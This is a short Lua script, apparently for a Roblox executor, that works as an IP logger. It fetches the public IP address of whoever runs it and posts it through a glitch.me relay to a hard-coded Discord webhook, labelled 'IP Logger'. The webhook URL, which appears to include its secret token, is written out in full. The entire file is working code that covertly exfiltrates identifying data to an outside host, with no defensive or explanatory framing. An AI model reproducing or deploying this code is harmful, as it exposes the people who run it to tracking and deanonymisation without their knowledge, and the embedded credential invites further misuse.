--will get user's ip
local ip,HttpService  = tostring(game:HttpGet("https://api.ipify.org", true)), game:GetService("HttpService")
local function SendMessage(Webhook, Message, Botname)
   if not string.find(Webhook, "https://discordapp.com/api/webhooks/1002856629743657062/9vLlAkYSklO2thD4N6rg1xi9Csbic1kdw05O_Iprznbv0O3gtiUns_dU3RUH46SKl6WX") then
       return error("Send a valid URL");
   end
   local Name;
   local API = "http://buritoman69.glitch.me/webhook";
   if (not Message or Message == "" or not Botname) then
       Name = "GameBot"
       return error("nil or empty message!")
   else
       Name = Botname;
   end
   local Body = {
       ['Key'] = tostring("applesaregood"),
       ['Message'] = tostring(Message),
       ['Name'] = Name,
       ['Webhook'] = Webhook    
   }
   Body = HttpService:JSONEncode(Body);
   local Data = game:HttpPost(API, Body, false, "application/json")
   return Data or nil;
end
SendMessage("https://discordapp.com/api/webhooks/1002856629743657062/9vLlAkYSklO2thD4N6rg1xi9Csbic1kdw05O_Iprznbv0O3gtiUns_dU3RUH46SKl6WX","IP: "..ip.." was logged.", "IP Logger")
